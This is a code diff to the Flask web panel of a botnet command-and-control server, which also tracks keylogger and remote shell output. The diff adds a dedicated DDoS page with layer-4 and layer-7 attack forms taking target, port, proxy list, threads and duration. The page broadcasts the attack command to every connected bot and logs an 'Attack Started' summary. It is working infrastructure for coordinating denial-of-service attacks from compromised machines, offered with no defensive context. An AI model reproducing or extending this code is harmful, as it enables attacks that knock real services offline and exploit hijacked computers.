@@ -509,6 +509,7 @@ all_address 	= []	# list of all addresses
 idNum       	= 0		# Bot ID number
 database    	= []	# list of all clients
 out 			= ""	# Command output
+ddos_output 	= ""	# DDoS output
 shell_out 	    = ""	# Shell Command output
 keylogger_out	= ""	# Keylogger output
 maxWorkers		= 500	# Max number of workers
@@ -802,6 +803,25 @@ def command_check(command):
 		else: return (f'{command} {ddos_method} {ddos_target} {ddos_threads} {ddos_time}')
 
 	else: return command
+
+def ddos_command_check_layer4(command):
+	ddos_target 	= request.form.get('layer4-target')
+	ddos_port 		= request.form.get('layer4-port')
+	ddos_threads 	= request.form.get('layer4-threads')
+	ddos_duration 	= request.form.get('layer4-duration')
+	if ddos_target == "" or ddos_port == "" or ddos_threads == "" or ddos_duration == "": return("Error: Please fill in all fields")
+	else: return f"ddos {command} {ddos_target} {ddos_port} {ddos_threads} {ddos_duration}"
+
+def ddos_command_check_layer7(command):
+	ddos_target 	= request.form.get('layer7-target')
+	ddos_proxy_type = request.form.get('layer7-proxy-type')
+	ddos_proxy_list = request.form.get('layer7-proxy-list')
+	ddos_rpc 		= request.form.get('layer7-rpc')
+	ddos_threads 	= request.form.get('layer7-threads')
+	ddos_duration 	= request.form.get('layer7-duration')
+	if ddos_target == "" or ddos_proxy_type == "" or ddos_proxy_list == "" or ddos_rpc == "" or ddos_threads == "" or ddos_duration == "": return("Error: Please fill in all fields")
+	else: return f"ddos {command} {ddos_target} {ddos_proxy_type} {ddos_proxy_list} {ddos_rpc} {ddos_threads} {ddos_duration}"
+
 #endregion
 
 #region Web GUI
@@ -863,9 +883,9 @@ def sendcommands():
 				command_ = request.form.get('command-selection')
 				command = ""
 
-				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', out=out)
+				if database == []: return render_template('sendcommands.html', commandStatus='No connected clients', commandOutput=out)
                 
-				if command_ == "": return render_template('sendcommands.html', commandStatus='No command selected', out=out)
+				if command_ == "": return render_template('sendcommands.html', commandStatus='No command selected', commandOutput=out)
 
 				elif command_ == "clear":
 					out = "" # clear output
@@ -875,37 +895,9 @@ def sendcommands():
 					out += f"\n\nConnected bots: {str(len(database))}"
 					return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
 
-				elif command_ == "ddos":
-					commandCheck = str(command_check(str(command_)))
-					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, out=out)
-					else: 
-						with ThreadPoolExecutor(max_workers=500) as executor:
-							try: 	
-								xx = 0
-								for x in database:
-									print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}")
-									executor.submit(_all_clients(int(x.idNum), str(commandCheck)))
-									xx += 1
-								command__ = commandCheck.split(" ")
-								out += f"""\n\n
-        --------- Attack Started ---------
-
-        Bots:   \t{xx}
-        Target: \t{command__[1]}
-        Method: \t{command__[2]}
-        Threads:\t{command__[3]}
-        Time:   \t{command__[4]}
-
-								"""
-								return render_template('sendcommands.html', commandStatus='Command Success', commandOutput=out)
-							except Exception as e: 
-								print_debug("Error while sending command" + str(e))
-								return render_template('sendcommands.html', commandStatus='Command Error', commandOutput=out)
-
-
 				else:
 					commandCheck = str(command_check(str(command_)))
-					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, out=out)
+					if commandCheck == "Error: Please fill in all fields": return render_template('sendcommands.html', commandStatus=commandCheck, commandOutput=out)
 					else:
 						command += commandCheck
 
@@ -925,6 +917,77 @@ def sendcommands():
 	except Exception as e:
 		print_debug(f"Error while sending command: {e}")
 		return redirect('login.html')
+
+
+@app.route('/ddos.html', methods=['get', 'post'])
+def ddos():
+	try:
+		global ddos_output
+		if session['loggedin']:				# if user is logged in
+			if request.method == 'POST':	# if user is sending commands
+				command_layer7 = request.form.get('command-selection-layer7') # get layer7 method from form
+				command_layer4 = request.form.get('command-selection-layer4') # get layer4 method from form
+
+				if database == []: return render_template('ddos.html', commandStatus='No connected clients', commandOutput=ddos_output)
+
+				elif command_layer7 == "" and command_layer4 == "": return render_template('ddos.html', commandStatus='No command selected', commandOutput=ddos_output)
+
+				elif command_layer7 != "" and command_layer4 == "": # layer7 command
+					commandCheck = str(ddos_command_check_layer7(str(command_layer7)))
+					if commandCheck == "Error: Please fill in all fields": ddos_output += "Error: Please fill in all fields" ; return render_template('ddos.html', commandStatus=commandCheck, commandOutput=ddos_output)
+					else: 
+						with ThreadPoolExecutor(max_workers=500) as executor:
+							try: 	
+								xx = 0
+								for x in database: print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}") ; executor.submit(_all_clients(int(x.idNum), str(commandCheck))) ; xx += 1
+								command_checkkk = commandCheck[5:]
+								command__ = command_checkkk.split(" ")
+								ddos_output += f"""\n\n
+        --------- Attack Started ---------
+
+        Bots:           \t{xx}
+        Methods:        \t{command__[0]}
+        Target:         \t{command__[1]}
+        Proxy Type:     \t{command__[2]}
+        RPC:            \t{command__[4]}
+        Threads:        \t{command__[5]}
+        Time:           \t{command__[6]}
+
+								"""
+								return render_template('ddos.html', commandStatus='Command Success', commandOutput=ddos_output)
+							
+							except Exception as e: print_debug("Error while sending attack" + str(e)) ; return render_template('ddos.html', commandStatus='Command Error', commandOutput=ddos_output)
+
+				elif command_layer7 == "" and command_layer4 != "": # layer4 command
+					commandCheck = str(ddos_command_check_layer4(str(command_layer4)))
+					if commandCheck == "Error: Please fill in all fields": ddos_output += "Error: Please fill in all fields" ; return render_template('ddos.html', commandStatus=commandCheck, commandOutput=ddos_output)
+					else: 
+						with ThreadPoolExecutor(max_workers=500) as executor:
+							try: 	
+								xx = 0
+								for x in database: print_debug(f"Sending {str(commandCheck)} to {int(x.idNum)}") ; executor.submit(_all_clients(int(x.idNum), str(commandCheck))) ; xx += 1
+								# remove ddos from command
+								command_checkkk = commandCheck[5:]
+								print_debug(f"Sending {command_checkkk}")
+								command__ = command_checkkk.split(" ")
+								ddos_output += f"""\n\n
+        --------- Attack Started ---------
+
+        Bots:   \t{xx}
+        Method: \t{command__[0]}
+        Target: \t{command__[1]}
+        Port:   \t{command__[2]}
+        Threads:\t{command__[3]}
+        Time:   \t{command__[4]}
+
+								"""
+								return render_template('ddos.html', commandStatus='Command Success', commandOutput=ddos_output)
+							
+							except Exception as e: print_debug("Error while sending attack" + str(e)) ; return render_template('ddos.html', commandStatus='Command Error', commandOutput=ddos_output)
+			
+			else: return render_template('ddos.html', commandOutput=ddos_output)
+
+	except Exception as e:print_debug(f"Error while sending command: {e}") ; return redirect('login.html')
 
 
 @app.route('/shell.html', methods=['get', 'post'])
